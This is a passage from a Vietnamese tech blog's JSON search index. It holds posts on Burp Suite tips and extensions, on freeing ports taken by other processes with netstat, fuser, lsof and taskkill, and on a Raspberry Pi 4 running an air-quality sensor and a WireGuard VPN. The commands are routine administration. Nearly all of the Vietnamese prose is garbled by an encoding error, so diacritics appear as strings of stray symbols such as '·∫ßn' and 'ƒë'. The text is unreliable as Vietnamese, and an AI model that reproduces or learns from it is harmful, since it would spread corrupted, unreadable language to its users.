nhi√™u l·∫ßn :D.\nKhi b·∫°n c√†i extension n√†y v√†o, mu·ªën copy m·ªôt request n√†o ƒë√≥ ra code python th√¨ r·∫•t ƒë∆°n gi·∫£n, b·∫°n ch·ªâ c·∫ßn chu·ªôt ph·∫£i v√†o request ƒë√≥ -\u0026gt; Extensions -\u0026gt; Copy as Requests, sau ƒë√≥ paste ra 1 chi·∫øc IDE hay editor n√†o m√† m√¨nh y√™u th√≠ch r·ªìi code ti·∫øp th√¥i\nV√≠ d·ª•, b·∫°n c√≥ request nh∆∞ sau: Sau khi s·ª≠ d·ª•ng extension ta s·∫Ω ƒë∆∞·ª£c ƒëo·∫°n code\nKh√° ti·ªán m√† ph·∫£i kh√¥ng, ti·∫øt ki·ªám ƒë∆∞·ª£c r·∫•t nhi·ªÅu th·ªùi gian code ƒë√≥, n√≥ c≈©ng c√≥ m·ªôt t√πy ch·ªçn n·ªØa l√† Copy as request with session object v√† ch√∫ng ta s·∫Ω thu ƒë∆∞·ª£c th√†nh qu·∫£ nh∆∞ sau\nƒê·ª° m·ªát m·ªèi, ti·ªán th·∫≠t lu√¥n ·∫•y.\nBurpSuiteAutoCompletion v√† HopLa N·∫øu b·∫°n ƒë√£ ch√°n c√°i c·∫£nh g√µ payload b·∫±ng tay th√¨ gi·ªù ƒë√¢y ch√∫ng ta c√≥ extension suggest payload tr√™n BurpSuite nh∆∞ suggest code tr√™n IDE lu√¥n m·∫∑c d√π ch∆∞a x·ªãn b·∫±ng :D\nB·∫°n ƒë·ªçc c√≥ th·ªÉ xem demo t·∫°i nh·ªØng ƒë∆∞·ªùng link d∆∞·ªõi nh√©\nhttps://twitter.com/Synacktiv/status/1390630017957351432\nhttps://twitter.com/StaticFlow/status/1367304795342721024\nK·∫øt Tr√™n ƒë√¢y l√† m·ªôt v√†i extension m√† m√¨nh hay s·ª≠ d·ª•ng v·ªõi Burp Suite, tuy ch∆∞a h·∫øt nh∆∞ng m√¨nh s·∫Ω c·ªë g·∫Øng gi·ªõi thi·ªáu c√°c extension hay v√† h·ªØu √≠ch tr√™n Burp Suite cho c√°c b·∫°n, c·∫£m ∆°n b·∫°n ƒë√£ ƒë·ªçc t·ªõi gi√¢y ph√∫t n√†y ;).\n","permalink":"https://minhtuanact.ml/posts/mot-vai-meo-ma-minh-su-dung-voi-burp-suite-phan-2/","summary":"B√†i n√†y l√† b√†i n·ªëi ti·∫øp v·ªÅ m·ªôt b√†i m√† m√¨nh ƒë√£ vi·∫øt t·∫°i M·ªôt v√†i m·∫πo m√† m√¨nh s·ª≠ d·ª•ng v·ªõi Burp Suite. B√†i ƒë·∫ßu ti√™n m√¨nh ƒë√£ vi·∫øt v·ªÅ m·ªôt v√†i tips v√† trick m√¨nh hay s·ª≠ d·ª•ng v·ªõi Burp Suite m·∫∑c ƒë·ªãnh r·ªìi, b√†i n√†y m√¨nh s·∫Ω vi·∫øt v·ªÅ m·ªôt v√†i extensions c·ªßa Burp Suite m√† m√¨nh hay d√πng nh√© ;)\nBurp Extensions ƒê√¢y l√† m·ªôt h√¨nh ch·ª•p nhanh c√°c extension trong Burp Suite c·ªßa m√¨nh, hi·ªán t·∫°i th√¨ v√†i c√°i th√¨ hay d√πng, v√†i c√°i th√¨ x√†i r·ªìi th√¥i kh√¥ng x√†i n·ªØa, m√¨nh ch·ªâ ƒëi·ªÉm qua nh·ªØng c√°i m√† m√¨nh c·∫£m th·∫•y hay v√† m·ªçi ng∆∞·ªùi c√≥ th·ªÉ d√πng n√≥ nh√© :D","title":"M·ªôt v√†i m·∫πo m√† m√¨nh s·ª≠ d·ª•ng v·ªõi Burp Suite (ph·∫ßn 2)"},{"content":"T·ª± s·ª± Chuy·ªán l√† c√≥ m·∫•y th·∫±ng em h·ªèi m√¨nh v·ªÅ c√°ch s·ª≠ d·ª•ng Burp Suite nh∆∞ th·∫ø n√†o, r·ªìi c√≥ tips and tricks n√†o hay hay kh√¥ng cho ch√∫ng n√≥ h·ªçc, ti·ªán ƒë√¢y m√¨nh c≈©ng chia s·∫ª kinh nghi·ªám c·ªßa m·ªôt ng∆∞·ªùi s·ª≠ d·ª•ng BurpSuite c≈©ng ƒë∆∞·ª£c m·ªôt kho·∫£ng th·ªùi gian r·ªìi. Hi v·ªçng nh·ªØng chia s·∫ª n√†y s·∫Ω gi√∫p √≠ch ƒë∆∞·ª£c cho b·∫°n ƒë·ªçc :v:\nBurp Suite l√† g√¨? ƒê·ªëi v·ªõi nh·ªØng b·∫°n l√†m pentester hay m·ªôt s·ªë b·∫°n QA (v√† c·∫£ nh·ªØng ng∆∞·ªùi anh ƒëang l√†m AI ·ªü c√¥ng ty m√¨nh n·ªØa :kissing_heart:) kh√©o c≈©ng ƒë√£ qu√° quen v·ªõi Burp Suite r·ªìi, m√¨nh ch·ªâ chia s·∫ª l·∫°i m·ªôt ch√∫t ƒë·ªÉ cho nh·ªØng b·∫°n ch∆∞a bi·∫øt ƒë·∫øn ph·∫ßn m·ªÅm c·ª±c k·ª≥ n·ªïi ti·∫øng ƒë∆∞·ª£c vi·∫øt b·∫±ng Java n√†y hi·ªÉu th√™m v·ªÅ n√≥ nh√©.\nBurp Suite ƒë∆∞·ª£c khai sinh b·ªüi Dafydd Stuttard (PortSwigger founder and CEO), v√† hi·ªán t·∫°i Burp Suite v·∫´n ƒëang ƒë∆∞·ª£c li√™n t·ª•c ph√°t tri·ªÉn b·ªüi PortSwigger. Tr·∫£i qua r·∫•t nhi·ªÅu phi√™n b·∫£n, BurpSuite ƒë√£ ƒë·ª° \u0026ldquo;x·∫•u\u0026rdquo; h∆°n v√† x·ªãn h∆°n ng√†y x∆∞a v√† c√≥ m·ªôt di·ªán m·∫°o nh∆∞ b√¢y gi·ªù.\nM√¥ h√¨nh ho·∫°t ƒë·ªông BurpSuite\nHi·ªán t·∫°i Burp Suite c√≥ 3 phi√™n b·∫£n, bao g·ªìm b·∫£n mi·ªÖn ph√≠ (Burp Suite Community Edition), b·∫£n m·∫•t ph√≠ (Burp Suite Professional) v√† b·∫£n d√†nh cho doanh nghi·ªáp (Burp Suite Enterprise Edition). V·ªÅ c√°ch c√†i ƒë·∫∑t th√¨ b·∫°n ƒë·ªçc c√≥ th·ªÉ ƒë·ªçc b√†i n√†y ƒë·ªÉ c√†i ƒë·∫∑t theo nh√©.\nM·ªôt s·ªë m·∫πo v·ªõi Burp Suite (tips and tricks) Ph√≠m t·∫Øt Vi·ªác s·ª≠ d·ª•ng ph√≠m t·∫Øt v·ªõi Burp Suite s·∫Ω khi·∫øn b·∫°n thao t√°c nhanh h∆°n, chu·∫©n h∆°n v√† \u0026ldquo;ng·∫ßu\u0026rdquo; h∆°n.\n1 s·ªë ph√≠m t·∫Øt m√¨nh hay s·ª≠ d·ª•ng nh∆∞ l√†:\n   Key Action     Ctrl + I Send request to Intruder   Ctrl + R Send request to Repeater   Ctrl + S Search   Ctrl + A Select All   Ctrl + Z Undo   Ctrl + Y Redo   Ctrl + B Base64 selection   Ctrl + Shift + B Decode Base64 selection   Ctrl + U URL-Encode key characters selection   Ctrl + Shift + U URL-Decode selection   Ctrl + I Send request to Intruder   Ctrl + F Forward Request (tab Proxy)   Ctrl + T Toggle Proxy Intercept On or Off (tab Proxy)    Copy URL M√¨nh kh√° th√≠ch t√≠nh nƒÉng n√†y, n√≥ copy nhanh cho m√¨nh c√°i URL tr√™n khu v·ª±c m√¨nh ƒëang l√†m vi·ªác, r·∫•t ti·ªán cho vi·ªác vi·∫øt b√°o c√°o\nB·∫°n c√≥ th·ªÉ chu·ªôt ph·∫£i v√†o request ·ªü b·∫•t c·ª© ƒë√¢u, r·ªìi ch·ªçn Copy URL V√† k·∫øt qu·∫£ n√≥ s·∫Ω cho ra l√†\n1  https://viblo.asia/posts/GrLZDGowKk0/   Copy as cURL command T∆∞∆°ng t·ª± nh∆∞ v·ªõi vi·ªác s·ª≠ d·ª•ng t√≠nh nƒÉng Copy URL th√¨ ch·ª©c nƒÉng n√†y c≈©ng ti·ªán nh∆∞ v·∫≠y, c√°ch s·ª≠ d·ª•ng th√¨ gi·ªëng v·ªõi Copy URL th√¥i nh∆∞ng n√≥ s·∫Ω chuy·ªÉn th√†nh d·∫°ng cURL command, ti·ªán v·ªõi vi·ªác test payload c·ªßa m√¨nh ·ªü ch·ªó kh√°c\n1 2 3  curl -i -s -k -X $\u0026#39;GET\u0026#39; \\  -H $\u0026#39;Host: viblo.asia\u0026#39; -H $\u0026#39;Connection: close\u0026#39; -H $\u0026#39;Content-Type: application/json\u0026#39; -H $\u0026#39;api-service-region-id: 1\u0026#39; -H $\u0026#39;Accept: application/json, text/plain, */*\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.62\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; \\  $\u0026#39;https://viblo.asia/posts/GrLZDGowKk0/\u0026#39;   Logger T√≠nh nƒÉng n√†y th√¨ m·ªõi ƒë∆∞·ª£c ƒë∆∞a v√†o g·∫ßn ƒë√¢y th√¥i, ng√†y x∆∞a m√¨nh d√πng extension Flow ƒë·ªÉ ƒë·ªçc log, nh∆∞ng PortSwigger ƒë√£ ƒë∆∞a t√≠nh nƒÉng n√†y v√†o global lu√¥n. N√≥ s·∫Ω ghi l·∫°i to√†n b·ªô c√°c request ƒë∆∞·ª£c b·∫Øt t·ª´ Proxy, hay nh·ªØng request m√¨nh s·ª≠ b√™n repeater, hay nh·ªØng request ch·∫°y b√™n intruder. N√≥i chung l√† log l·∫°i h·∫øt, r·∫•t ti·ªán cho vi·ªác search l·∫°i c√°c param hay k·∫øt qu·∫£ m√¨nh c·∫ßn ph·∫£i l·ªçc ra hay ƒë·ªçc l·∫°i.\nMatch and Replace N·∫øu c√°c b·∫°n hay g·∫∑p c√°i m√£ code 304 n√†y, th√¨ t·ª©c l√† n·ªôi dung n√≥ ƒë√£ ƒë∆∞·ª£c cache trong tr√¨nh duy·ªát, m√† b·∫°n l·∫°i mu·ªën xem n·ªôi dung c·ªßa response n√†y th√¨ ph·∫£i xo√° c√°i d√≤ng If-None-Match kia ƒëi r·ªìi g·ª≠i request l·∫°i th√¨ s·∫Ω ƒë·ªçc ƒë∆∞·ª£c response. Tuy nhi√™n ·ªü trong BurpSuite c√≥ ch·∫ø ƒë·ªô Match and Replace, m√¨nh s·∫Ω c√†i ƒë·∫∑t cho l√∫c n√†o trong request c≈©ng xo√° c√°i d√≤ng If-None-Match ƒëi nh√©.\nTruy c·∫≠p v√†o Proxy -\u0026gt; Options -\u0026gt; Match and Replace C√†i ƒë·∫∑t nh∆∞ tr√™n h√¨nh r·ªìi b·∫•m OK\nNh·ªõ ch·ªçn tick v√†o Enable l√™n th√¨ m·ªõi ho·∫°t ƒë·ªông ƒë∆∞·ª£c nha ^^\nB·∫°n c√≥ th·ªÉ t·∫°o n√™n v√†i k·ªãch b·∫£n th√∫ v·ªã v·ªõi ch·ª©c nƒÉng n√†y ƒë·∫•y ^^\nTLS Pass Through ƒê·ªëi v·ªõi nh·ªØng pentester Android hay ch·∫°y proxy qua Firefox th√¨ r·∫•t hay g·∫∑p m·∫•y c√°i request m√¨nh kh√¥ng mong mu·ªën Burp capture l·∫°i (v·ª´a n·∫∑ng b·ªô nh·ªõ, v·ª´a th·ª´a th√¥ng tin v√† r·ªëi m·∫Øt). B·∫°n ƒë·ªçc c√†i ƒë·∫∑t nh∆∞ tr√™n h√¨nh l√† s·∫Ω kh√¥ng bao gi·ªù nh√¨n th·∫•y m·∫•y c√°i request l·∫±ng nh·∫±ng ƒë·∫•y ·ªü tr√™n BurpSuite n·ªØa ƒë√¢u :p\nK·∫øt Tr√™n ƒë√¢y l√† m·ªôt s·ªë tips and tricks m√† m√¨nh ƒëang s·ª≠ d·ª•ng v·ªõi Burp Suite. Ph·∫ßn sau m√¨nh s·∫Ω chia s·∫ª th√™m v·ªÅ c√°c extension m√† m√¨nh ƒëang d√πng v·ªõi Burp Suite. Hi v·ªçng b·∫°n ƒë·ªçc s·∫Ω ƒë√≥n nh·∫≠n :D.\n","permalink":"https://minhtuanact.ml/posts/mot-vai-meo-ma-minh-su-dung-voi-burp-suite/","summary":"T·ª± s·ª± Chuy·ªán l√† c√≥ m·∫•y th·∫±ng em h·ªèi m√¨nh v·ªÅ c√°ch s·ª≠ d·ª•ng Burp Suite nh∆∞ th·∫ø n√†o, r·ªìi c√≥ tips and tricks n√†o hay hay kh√¥ng cho ch√∫ng n√≥ h·ªçc, ti·ªán ƒë√¢y m√¨nh c≈©ng chia s·∫ª kinh nghi·ªám c·ªßa m·ªôt ng∆∞·ªùi s·ª≠ d·ª•ng BurpSuite c≈©ng ƒë∆∞·ª£c m·ªôt kho·∫£ng th·ªùi gian r·ªìi. Hi v·ªçng nh·ªØng chia s·∫ª n√†y s·∫Ω gi√∫p √≠ch ƒë∆∞·ª£c cho b·∫°n ƒë·ªçc :v:\nBurp Suite l√† g√¨?","title":"M·ªôt v√†i m·∫πo m√† m√¨nh s·ª≠ d·ª•ng v·ªõi Burp Suite"},{"content":"Hi ch√†o c√°c b·∫°n, d·∫°o n√†y m√¨nh hay g·∫∑p v·∫•n ƒë·ªÅ Port Already in Use tr√™n Windows do m√¨nh s·ª≠ d·ª•ng h∆°i nhi·ªÅu ch∆∞∆°ng tr√¨nh c√πng m·ªôt l√∫c, t·ª©c l√† m√¨nh kh√¥ng th·ªÉ m·ªü ch∆∞∆°ng tr√¨nh v√¨ ƒëang c√≥ ch∆∞∆°ng tr√¨nh kh√°c chi·∫øm port ƒë√≥ r·ªìi. C√°i n√†y kh√° l√† kh√≥ ch·ªãu, ƒë√¥i khi b·∫°n kh√¥ng bi·∫øt ch∆∞∆°ng tr√¨nh n√†o ƒëang s·ª≠ d·ª•ng port ƒë·∫•y ƒë·ªÉ m√† t·∫Øt ƒëi. Nay m√¨nh s·∫Ω h∆∞·ªõng d·∫´n c√°c b·∫°n x·ª≠ l√Ω v·∫•n ƒë·ªÅ n√†y nh√©\nM√¨nh th·∫•y c√≥ 2 c√°ch x·ª≠ l√Ω ch√≠nh:\n B·∫°n ƒëang c·∫ßn m·ªü ch∆∞∆°ng tr√¨nh A s·ª≠ d·ª•ng port 8080, tuy nhi√™n ch∆∞∆°ng tr√¨nh B ƒë√£ chi·∫øm port 8080 t·ª´ bao gi·ªù r·ªìi. V·∫≠y b·∫°n c√≥ th·ªÉ t·∫Øt ch∆∞∆°ng tr√¨nh B ƒëi ƒë·ªÉ m·ªü ƒë∆∞·ª£c ch∆∞∆°ng tr√¨nh A T√¨nh hu·ªëng nh∆∞ b√™n tr√™n, tuy nhi√™n b·∫°n c√≥ th·ªÉ config l·∫°i ch∆∞∆°ng tr√¨nh A s·ª≠ d·ª•ng port kh√°c ƒëang tr·ªëng ƒë·ªÉ kh·ªüi ƒë·ªông ch∆∞∆°ng tr√¨nh A l√™n  C√° nh√¢n m√¨nh th·∫•y (v√† m√¨nh ƒë√£ g·∫∑p r·∫•t nhi·ªÅu tr∆∞·ªùng h·ª£p) vi·ªác config l·∫°i port default m·∫•t kh√° nhi·ªÅu th·ªùi gian, config l·∫°i ch∆∞∆°ng tr√¨nh ƒë√≥ xong n√≥ k√©o theo c√°c v·∫•n ƒë·ªÅ kh√°c n·ªØa n√™n kh√° l√† m·ªát. Cho n√™n m√¨nh th∆∞·ªùng xem x√©t ch∆∞∆°ng tr√¨nh B m√¨nh c√≥ c·∫ßn s·ª≠ d·ª•ng n·ªØa kh√¥ng th√¨ t·∫Øt qu√°ch n√≥ ƒëi. Tuy nhi√™n gi·ªØa 1 ƒë·ªëng service, 1 ƒë·ªëng ch∆∞∆°ng tr√¨nh ƒëang ch·∫°y ng·∫ßm th√¨ b·∫°n kh√¥ng bi·∫øt ƒë∆∞·ª£c ch∆∞∆°ng tr√¨nh n√†o ƒëang s·ª≠ d·ª•ng c√°i port kia ƒë·ªÉ t·∫Øt ƒëi ƒë√∫ng kh√¥ng, sau ƒë√¢y m√¨nh s·∫Ω h∆∞·ªõng d·∫´n c√°c b·∫°n ki·ªÉm tra xem port ƒë√≥ ƒëang ch·∫°y v·ªõi ch∆∞∆°ng tr√¨nh n√†o nh√©\nƒê·ªëi v·ªõi Linux V√≠ d·ª• ·ªü ƒë√¢y m√¨nh ƒëang s·ª≠ d·ª•ng port 8081 ƒë·ªÉ m·ªü http.server tr√™n python\n1 2 3  ‚îå‚îÄ‚îÄ(minhtuan„âøMinhTuan-ACER)-[~] ‚îî‚îÄ$ python3 -m http.server 8080 130 ‚®Ø Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...   Gi·ªù m√¨nh qu√™n m·∫•t l√† m√¨nh ƒëang m·ªü n√≥, c√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ ki·ªÉm tra\nC√°ch 1: netstat S·ª≠ d·ª•ng l·ªánh netstat -paten ƒë·ªÉ ki·ªÉm tra c√°c port ƒëang s·ª≠ d·ª•ng\n1 2 3 4 5 6 7  ‚îå‚îÄ‚îÄ(minhtuan„âøMinhTuan-ACER)-[/mnt/c/Users/minht] ‚îî‚îÄ$ sudo netstat -paten [sudo] password for minhtuan: Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State User Inode PID/Program name tcp 0 0 0.0.0.0:8080 0.0.0.0:* LISTEN 1000 16551 77/python3   Ki·ªÉm tra ƒë√£ th·∫•y port 8080 ƒëang ƒë∆∞·ª£c s·ª≠ d·ª•ng b·ªüi PID=77, ch∆∞∆°ng tr√¨nh python3\nKill PID 77 ƒëi l√† ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng port 8080 r·ªìi ;) (nh·ªõ d√πng quy·ªÅn sudo ƒë√≥ nh√©)\n1  sudo kill -9 77   C√°ch 2: fuser C√≥ c√°ch kh√°c l√† s·ª≠ d·ª•ng l·ªánh fuser, tuy nhi√™n l·ªánh n√†y kh√¥ng show cho ch√∫ng ta program name l√† g√¨ nh∆∞ng c√°c b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng\n1 2 3  ‚îå‚îÄ‚îÄ(minhtuan„âøMinhTuan-ACER)-[/mnt/c/Users/minht] ‚îî‚îÄ$ sudo fuser 8081/tcp 1 ‚®Ø 8081/tcp: 77   Kill t∆∞∆°ng t·ª± l·ªánh kill b√™n tr√™n, ho·∫∑c s·ª≠ d·ª•ng l·ªánh sudo fuser -k 8080/tcp l√† kill process ƒë∆∞·ª£c :D\nC√°ch 3: lsof List c√°c process ƒëang l·∫Øng nghe port 8080:\n1 2 3 4  ‚îå‚îÄ‚îÄ(minhtuan„âøMinhTuan-ACER)-[/mnt/c/Users/minht] ‚îî‚îÄ$ sudo lsof -i:8080 1 ‚®Ø COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME python3 77 minhtuan 3u IPv4 16551 0t0 TCP *:tproxy (LISTEN)   Kill to√†n b·ªô process ƒëang l·∫Øng nghe ·ªü port 8080:\n1  sudo kill $(lsof -t -i:8080)   ƒê·ªëi v·ªõi Windows Windows th√¨ ph·ª©c t·∫°p h∆°n m·ªôt ch√∫t, c≈©ng s·∫Ω c√≥ l·ªánh cho c√°c b·∫°n s·ª≠ d·ª•ng, tuy nhi√™n ng∆∞·ªùi d√πng Windows kh√¥ng hay g√µ l·ªánh l·∫Øm m√† s·ª≠ d·ª•ng giao di·ªán, m√¨nh s·∫Ω gi·ªõi thi·ªáu c·∫£ 2 c√°ch nh√©\nS·ª≠ d·ª•ng Task Manager M·ªü Task Manager b·∫±ng c√°ch chu·ªôt ph·∫£i v√†o startbar v√† ch·ªçn Task Manager\nM·ªü giao di·ªán Resource Monitor b·∫±ng c√°ch ch·ªçn tab Performance v√† ch·ªçn n√≥\nSang tab Network\n·ªû ƒë√¢y c√≥ th·ªÉ check ƒë∆∞·ª£c nh·ªØng port n√†o ƒëang m·ªü, PID ch∆∞∆°ng tr√¨nh ƒëang s·ª≠ d·ª•ng port ƒë√≥ l√† bao nhi√™u, tuy nhi√™n m√¨nh kh√¥ng th·ªÉ kill PID ·ªü m√†n h√¨nh n√†y ƒë∆∞·ª£c, c·∫ßn chuy·ªÉn sang tab Details c·ªßa Task Manager\nX√°c ƒë·ªãnh ƒë∆∞·ª£c PID n√†o b·∫°n mu·ªën kill th√¨ chu·ªôt ph·∫£i ch·ªçn End task l√† xong\nS·ª≠ d·ª•ng Command line T∆∞∆°ng t·ª± nh∆∞ v·ªõi Linux, Windows c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng command line ƒë·ªÉ t√¨m ki·∫øm v√† kill process\nV·∫´n s·ª≠ d·ª•ng netstat\n1 2 3 4  ‚ûú ~ netstat -aon | findstr \u0026#34;8080\u0026#34; TCP 127.0.0.1:6767 127.0.0.1:8080 ESTABLISHED 16792 TCP 127.0.0.1:8080 0.0.0.0:0 LISTENING 2408 TCP 127.0.0.1:8080 127.0.0.1:6767 ESTABLISHED 2408   C·ªôt cu·ªëi c√πng ch√≠nh l√† gi√° tr·ªã c·ªßa PID, kill PID s·ª≠ d·ª•ng c√¢u l·ªánh b√™n d∆∞·ªõi\n1  ‚ûú ~ taskkill /PID \u0026lt;process_id\u0026gt; /F   Kh√°c ƒê·ªëi v·ªõi Windows th√¨ c√≥ nhi·ªÅu ph·∫ßn m·ªÅm c√≥ th·ªÉ hi·ªÉn th·ªã v√† gi√∫p ch√∫ng ta check r·ªìi kill process d·ªÖ d√†ng h∆°n, c√°c b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng nh·ªØng ph·∫ßn m·ªÅm ƒë√≥, tuy nhi√™n v·∫´n c·∫ßn ph·∫£i ƒë·∫£m b·∫£o an to√†n nh√©.\nK·∫øt Qua ƒë√¢y l√† m·ªôt v√†i c√°ch m√† c√°c b·∫°n c√≥ th·ªÉ t√¨m ki·∫øm, ki·ªÉm tra v√† kill nh·ªØng process kh√¥ng c·∫ßn thi·∫øt ƒëang chi·∫øm port c·ªßa m√¨nh. C·∫£m ∆°n c√°c b·∫°n ƒë√£ ƒë·ªçc t·ªõi ƒë√¢y :D. H·∫πn g·∫∑p l·∫°i.\n","permalink":"https://minhtuanact.ml/posts/xu-ly-van-de-port-already-in-use-tren-linux-va-windows/","summary":"Hi ch√†o c√°c b·∫°n, d·∫°o n√†y m√¨nh hay g·∫∑p v·∫•n ƒë·ªÅ Port Already in Use tr√™n Windows do m√¨nh s·ª≠ d·ª•ng h∆°i nhi·ªÅu ch∆∞∆°ng tr√¨nh c√πng m·ªôt l√∫c, t·ª©c l√† m√¨nh kh√¥ng th·ªÉ m·ªü ch∆∞∆°ng tr√¨nh v√¨ ƒëang c√≥ ch∆∞∆°ng tr√¨nh kh√°c chi·∫øm port ƒë√≥ r·ªìi. C√°i n√†y kh√° l√† kh√≥ ch·ªãu, ƒë√¥i khi b·∫°n kh√¥ng bi·∫øt ch∆∞∆°ng tr√¨nh n√†o ƒëang s·ª≠ d·ª•ng port ƒë·∫•y ƒë·ªÉ m√† t·∫Øt ƒëi. Nay m√¨nh s·∫Ω h∆∞·ªõng d·∫´n c√°c b·∫°n x·ª≠ l√Ω v·∫•n ƒë·ªÅ n√†y nh√©","title":"X·ª≠ l√Ω v·∫•n ƒë·ªÅ \"Port Already in Use\" tr√™n Linux v√† Windows"},{"content":"T·ª± s·ª± H·ªìi ƒë·∫ßu nƒÉm 2020, m√¨nh m·ªõi c√≥ order Taobao v·ªÅ ƒë∆∞·ª£c m·ªôt em RaspberryPi 4 ƒë·ªÉ ph·ª•c v·ª• c√¥ng vi·ªác c·ªßa m√¨nh (th·ª±c ra h·ªìi ƒë√≥ mua ch∆°i th√¥i, mang v·ªÅ ngh·ªãch cho vui). Em Pi 4 n√†y kh√° m·∫°nh, l√†m ƒë∆∞·ª£c ƒë·ªß th·ª© tr√≤, Ram 4GB DDR4, s·ª≠ d·ª•ng ngu·ªìn 15W, ch·∫°y ki·∫øn tr√∫c ARM 64-bit (Raspberry Pi OS b·∫£n ch√≠nh th·ª©c v·∫´n ƒëang ch·∫°y 32-bit, n·∫øu b·∫°n mu·ªën s·ª≠ d·ª•ng h·∫øt s·ª©c m·∫°nh c·ªßa con Pi 4 t·ª´ 4GB tr·ªü l√™n th√¨ ph·∫£i c√†i OS n√†o h·ªó tr·ª£ 64-bit nh√©).\nH·ªìi ƒë√≥ m√¨nh mua combo c·∫£ case, fan t·∫£n nhi·ªát (c√≥ ƒë√®n led RGB l·∫≠p l√≤e l√†m ƒë√®n ng·ªß c≈©ng ƒë∆∞·ª£c), ngu·ªìn c√≥ c√¥ng t·∫Øc kh√° ti·ªán (m·∫∑c d√π em Pi 4 n√†y b√¢y gi·ªù m√¨nh ch·∫≥ng t·∫Øt ƒëi bao gi·ªù), v√† quan tr·ªçng em n√†y c√≥ s·ª≠ d·ª•ng USB 3.0 ngon ph·∫øt. N·∫øu anh em k th√≠ch t·ªëc ƒë·ªô ch·∫≠m ch·∫≠m c·ªßa th·∫ª nh·ªõ th√¨ c·∫Øm h·∫≥n con SSD qua c·ªïng USB 3.0 n√†y ch·∫°y cho n√≥ max c√¥ng su·∫•t :heart_eyes:\nM·ªôt v√†i d·ª± √°n m√¨nh ƒëang s·ª≠ d·ª•ng tr√™n em Pi 4 n√® Sun* AirViewer Hi·ªán t·∫°i m√¨nh ƒëang ch·∫°y 1 node sensor ƒëo kh√¥ng kh√≠ t·∫°i nh√†, c√°c b·∫°n c√≥ th·ªÉ xem d·ª± √°n n√†y t·∫°i https://github.com/sun-asterisk-research/air-viewer\nD·ª± √°n n√†y ƒë∆∞·ª£c th·ª±c hi·ªán theo √Ω t∆∞·ªüng c·ªßa m·ªôt ng∆∞·ªùi anh, ng∆∞·ªùi s·∫øp m·∫´u m·ª±c @vigov5, c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc th√™m t·∫°i b√†i vi·∫øt n√†y nh√© https://viblo.asia/p/tu-do-chi-so-o-nhiem-khong-khi-tai-nha-voi-sensor-va-raspberry-pi-YWOZrBBvZQ0\nTrang ch·ªß: https://airviewer.sun-asterisk.vn/\n M·ªõi c√≥ 2 node th√¥i anh em ·∫° :(, hi v·ªçng l√† c√≥ nhi·ªÅu node h∆°n ƒë·ªÉ xem cho vui :v\n WireGuard Server M√¨nh ƒëang c√†i m·ªôt server WireGuard tr√™n em n√≥ ƒë·ªÉ thi tho·∫£ng nh·∫£y v·ªÅ nh√† ƒëi·ªÅu khi·ªÉn v√†i th·ª© kh√°c, c√°ch c√†i ƒë·∫∑t c≈©ng d·ªÖ th√¥i, tuy nhi√™n c√°c b·∫°n s·∫Ω d√≠nh ph·∫£i 1 v√†i l·ªói li√™n quan ƒë·∫øn module th√¨ l√†m theo c√°ch d∆∞·ªõi nh√©\nFix l·ªói Module wireguard not found in directory 1 2 3 4 5  [#] ip link add wg0 type wireguard Error: Unknown device type. Unable to access interface: Protocol not supported [#] ip link delete dev wg0 Cannot find device \u0026#34;wg0\u0026#34;   Ch·∫°y l·ªánh load module v√†o kernel\n1  sudo dpkg-reconfigure wireguard-dkms   Tuy nhi√™n, do vi·ªác s·ª≠ d·ª•ng m·∫°ng nh√†, c√≤n g·ªçi l√† ƒë∆∞·ª£c m·∫°ng gia ƒë√¨nh ƒë·ªÉ c√†i ƒë·∫∑t WireGuard Server, m√† m·∫°ng gia ƒë√¨nh th√¨ m√¨nh kh√¥ng b·ªè ti·ªÅn ra ƒë·ªÉ mua IP tƒ©nh v√¨ n√≥ l√£ng ph√≠ :v, n√™n m√¨nh s·ª≠ d·ª•ng Dynamic DNS. C√°c b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng m·ªôt v√†i d·ªãch v·ª• nh∆∞ h√¨nh b√™n d∆∞·ªõi (h√¨nh m√¨nh ch·ª•p t√≠nh nƒÉng Dynamic DNS tr√™n modem c·ªßa FPT). Do m·∫°ng gia ƒë√¨nh l√† m·∫°ng IP ƒë·ªông, c·ª© thi tho·∫£ng m·∫°ng nh√† n√≥ l·∫°i ƒë·ªïi IP sang m·ªôt ƒë·ªãa ch·ªâ kh√°c, v·∫≠y ƒë·ªÉ l√∫c n√†o c≈©ng truy c·∫≠p ƒë√∫ng c√°i IP m·∫°ng nh√† m√¨nh th√¨ s·ª≠ d·ª•ng Dynamic DNS s·∫Ω gi√∫p cho b·∫°n l√∫c n√†o c≈©ng truy c·∫≠p ƒë∆∞·ª£c m·∫°ng nh√† m√¨nh t·ª´ xa :D.\nDo vi·ªác s·ª≠ d·ª•ng WireGuard n√†y kh√° ti·ªán, l√∫c n√†o m√¨nh ng·ªìi nh·ªØng qu√°n c√¥ng c·ªông c·∫ßn ri√™ng t∆∞ th√¨ m√¨nh s·∫Ω b·∫≠t n√≥ l√™n, thay v√¨ m√¨nh VPN l√™n c√°i server b√™n ƒê·ª©c xa t√≠t t·∫Øp th√¨ m√¨nh VPN ƒë·∫øn m·∫°ng nh√† m√¨nh lu√¥n, v·ª´a g·∫ßn v·ª´a nhanh d√πng s∆∞·ªõng h·∫≥n :D\n V·ªÅ Wireguard c√≥ th·ªÉ ƒë·ªçc th√™m t·∫°i: https://viblo.asia/p/wireguard-mot-tac-pham-nghe-thuat-3Q75w1OeZWb\n Vi·ªác c√†i ƒë·∫∑t WireGuard cho Pi 4 m√¨nh c·∫£m th·∫•y n√≥ c√≥ l·ª£i nh·∫•t ƒë·∫•y. K·∫øt n·ªëi v·ªõi WireGuard c·ª±c k·ª≥ nhanh, m√† t·ª´ c√¥ng ty v·ªÅ ƒë·∫øn nh√† c≈©ng kh√° g·∫ßn n√™n k·∫øt n·ªëi kh√¥ng 